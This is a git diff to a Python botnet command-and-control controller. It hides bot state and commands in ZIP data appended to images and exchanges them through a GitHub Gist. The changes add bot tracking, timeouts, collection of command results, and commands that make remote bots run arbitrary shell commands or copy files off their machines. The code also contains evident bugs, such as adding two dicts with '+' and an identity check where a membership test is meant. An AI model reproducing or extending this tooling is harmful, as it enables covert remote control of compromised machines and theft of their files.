@@ -3,25 +3,19 @@ import os
 import select
 import shutil
 import sys
-from typing import Optional, Any
-import json
+from typing import Optional, Any, Dict, Union
+import time
 
-from git import GithubGistClient
-
-# from time import sleep
-import subprocess
-
-IMAGES_LIBRARY = '4c7fe7e6d06b0b90ab4848b234209e95'
-CONTROL_IMAGE = 'security.jpg'
-UPDATE_INTERVAL = 30  # seconds
-KEEP_ALIVE_TIMEOUT = 90  # seconds
-
-TMP_STATE_FILE = 'state.json'
-TMP_ZIP_FILE = 'data.zip'
-
-
-def _is_image(file_name: str):
-    return file_name.endswith('.png') or file_name.endswith('.jpg')
+from common import \
+    GithubGistClient, \
+    IMAGES_LIBRARY, \
+    CONTROL_IMAGE, \
+    UPDATE_INTERVAL, \
+    KEEP_ALIVE_TIMEOUT, \
+    now_ms, \
+    is_image, \
+    decode_data, \
+    encode_data
 
 
 class Controller:
@@ -83,6 +77,7 @@ class Controller:
             skip_pull=self._skip_init_pull,
         )
 
+        self._current_timestamp = now_ms()
         self._bots = {}
         self._pending_commands = {}
 
@@ -90,9 +85,9 @@ class Controller:
 
     def run(self) -> None:
         self._setup()
-        self._update_state()
 
         while True:
+            self._update_state()
             print(
                 '\nEnter a command. Use ? or help to show help.\n'
                 f'Auto update in {UPDATE_INTERVAL} seconds. Press enter to force update.\n'
@@ -108,7 +103,6 @@ class Controller:
                 # so we do not write to the prompt line
                 # note: we could also use ASCII ESC sequences to clear the prompt (and add colors as well)
                 print('')
-            self._update_state()
 
         pass
 
@@ -117,58 +111,92 @@ class Controller:
         print('Stopping the controller. Note that the bots might still be running.')
         print('Use terminate command to stop a specific bot.')
 
-    def _encode_data(self, image_file: str, data: Any, output_file):
-        with open(TMP_STATE_FILE, 'w', encoding='utf-8') as f:
-            json.dump(data, f, ensure_ascii=False)
-        subprocess.check_call(
-            # needed otherwise zip output will be different every time because zip stores modification times
-            args=['touch', '-t', '202212241800.00', TMP_STATE_FILE]
-        )
-        subprocess.check_call(
-            # -j junk paths (do not make directories)
-            # -X Do not save extra file attributes (Extended Attributes on OS/2, uid/gid and file times on Unix).
-            #    see https://stackoverflow.com/a/9714323
-            args=['zip', '-jX', TMP_ZIP_FILE, TMP_STATE_FILE],
-        )
-        subprocess.check_call(
-            args=f"cat '{image_file}' '{TMP_ZIP_FILE}' > '{output_file}'",
-            shell=True,
-        )
-        os.remove(TMP_STATE_FILE)
-        os.remove(TMP_ZIP_FILE)
+    def _update_bot(self, name: str, data: Any) -> bool:
+        print(f'trying update bot {name}', data)
 
-    def _decode_data(self, image_file_with_data: str) -> Any:
-        # we are not checking exit code here because while unzipping the images with appended ZIP data
-        # unzip produces warning [<file name>]:  xxx extra bytes at beginning or within zipfile
-        # and exits a non-zero exit code
-        # we could parse its stdout/stderr to find out if something was actually extracted
-        subprocess.call(
-            # -j junk paths (do not make directories)
-            # -o overwrite files WITHOUT prompting
-            args=['unzip', '-jo', image_file_with_data],
-        )
-        data = None
-        if os.path.isfile(TMP_STATE_FILE):
-            with open(TMP_STATE_FILE, 'r', encoding='utf-8') as f:
-                data = json.load(f)
-            os.remove(TMP_STATE_FILE)
-        # note: if there were multiple files extracted from the image, they will remain in the workdir
-        return data
+        if not isinstance(data, dict):
+            return False
+        if 'last_update' not in data or not isinstance(data['last_update'], int):
+            return False
+        last_update = data['last_update']
+        if (self._current_timestamp - last_update) > KEEP_ALIVE_TIMEOUT:
+            if name is self._bots:
+                print(f'bot {name} timed out, removing')
+                del self._bots[name]
+                del self._pending_commands[name]
+                return False
+
+        if name not in self._bots:
+            bot = {
+                'last_update': last_update,
+                'cmd': None,
+            }
+            self._bots[name] = bot
+            self._pending_commands[name] = None
+        else:
+            self._bots[name]['last_update'] = last_update
+
+        pending_cmd = self._bots[name]['cmd']
+
+        if pending_cmd is not None:
+            result = data['result'] if 'result' in data and isinstance(data['result'], dict) else None
+            result_id = result['id'] if 'id' in result and isinstance(result['id'], str) else None
+
+            if pending_cmd['id'] == result_id:
+                print('command finished')
+
+                result_timestamp = \
+                    result['timestamp'] if 'timestamp' in result and isinstance(result['timestamp'], str) else None
+                result_exit_code = \
+                    result['exit_code'] if 'exit_code' in result and isinstance(result['exit_code'], str) else None
+                result_stdout = result['stdout'] if 'stdout' in result and isinstance(result['stdout'], str) else None
+                result_stderr = result['stderr'] if 'stderr' in result and isinstance(result['stderr'], str) else None
+
+                print(f'exit_code={result_exit_code}')
+                print(result_stdout)
+                print(result_stderr)
+
+                self._bots[name]['cmd'] = None
+                self._pending_commands[name] = None
+
+        return True
 
     def _update_state(self) -> None:
-        print('updating bots state ...')
+        print('updating state ...')
+        self._current_timestamp = now_ms()
+
         self._comm_client.pull_changes()
-        # TODO
 
-        data_files = set(filter(lambda f: f != CONTROL_IMAGE and _is_image(f), os.listdir('comm')))
+        data_files = set(filter(lambda f: f != CONTROL_IMAGE and is_image(f), os.listdir('comm')))
 
-        for data_file in data_files:
-            bot_name = data_file[0:-4]  # removes .png or .jpg extension
+        for bot_name in data_files:
             # TODO: consider handling exceptions and removing invalid files instead of just crashing
-            bot_data = self._decode_data('comm/' + data_file)
-            # TODO: process data
+            bot_data = decode_data('comm/' + bot_name)
+            if not self._update_bot(bot_name, bot_data):
+                print(f'removing {bot_name}')
+                os.remove('comm/' + bot_name)
+                self._comm_client.add([bot_name])
 
-        self._encode_data(
+        # handles case when the bot's file is gone,
+        # but we have still record in the memory
+        bots_to_delete = []
+        for bot_name, bot in self._bots.items():
+            print(bot_name, bot, (self._current_timestamp - bot['last_update']) // 1000)
+            if (self._current_timestamp - bot['last_update']) > KEEP_ALIVE_TIMEOUT:
+                print(f'bot {bot_name} timed out, removing')
+                bots_to_delete.append(bot_name)
+                # cannot delete here during the dict iteration
+            elif not os.path.exists('comm/' + bot_name):
+                print(f'bot image {bot_name} does not exist, removing bot')
+                bots_to_delete.append(bot_name)
+        for bot_name in bots_to_delete:
+            del self._bots[bot_name]
+            del self._pending_commands[bot_name]
+            if os.path.exists('comm/' + bot_name):
+                os.remove('comm/' + bot_name)
+                self._comm_client.add([bot_name])
+
+        encode_data(
             image_file='lib/' + CONTROL_IMAGE,
             data=self._pending_commands,
             output_file='comm/' + CONTROL_IMAGE,
@@ -180,7 +208,7 @@ class Controller:
         pass
 
     def _load_lib_images(self):
-        self._lib_images = set(filter(_is_image, os.listdir('lib')))
+        self._lib_images = set(filter(is_image, os.listdir('lib')))
         print(f'library contains {len(self._lib_images)} images:')
         for img in self._lib_images:
             print(f'  {img}')
@@ -196,6 +224,23 @@ class Controller:
         return bot in self._bots
 
     # COMMANDS
+
+    # noinspection PyMethodMayBeStatic
+    def _generate_new_command_id(self) -> str:
+        return os.urandom(16).hex()
+
+    def _create_command(self, name: str, args: Dict[str, Union[str, bool, int]]) -> Dict[str, Union[str, bool, int]]:
+        header = {
+            'id': self._generate_new_command_id(),
+            'timestamp': time.time_ns() // 1000,  # epoch in milliseconds
+            'name': name,
+        }
+        return header + args
+
+    def _set_command(self, bot: str, cmd: Dict[str, Union[str, bool, int]]) -> None:
+        self._bots[bot]['cmd'] = cmd
+        self._pending_commands[bot] = cmd
+        return
 
     @staticmethod
     def _print_help() -> None:
@@ -228,6 +273,10 @@ class Controller:
         )
 
     def _process_terminate_command(self, bot) -> None:
+        self._set_command(bot, self._create_command(
+            name='terminate',
+            args={},
+        ))
         pass
 
     def _process_run_command(self, bot, shell: bool, cmd: Optional[str]) -> None:
@@ -237,6 +286,13 @@ class Controller:
         if cmd == '':
             print('Invalid empty <command> argument!')
             return
+        self._set_command(bot, self._create_command(
+            name='run',
+            args={
+                'shell': shell,
+                'cmd': cmd,
+            },
+        ))
         pass
 
     def _process_copy_from_command(self, bot, file_name: Optional[str]) -> None:
@@ -246,6 +302,12 @@ class Controller:
         if file_name == '':
             print('Invalid empty <file name> argument!')
             return
+        self._set_command(bot, self._create_command(
+            name='copy_from',
+            args={
+                'file_name': file_name,
+            },
+        ))
         pass
 
     def _process_do_command(self, bot, action: Optional[str]) -> None:
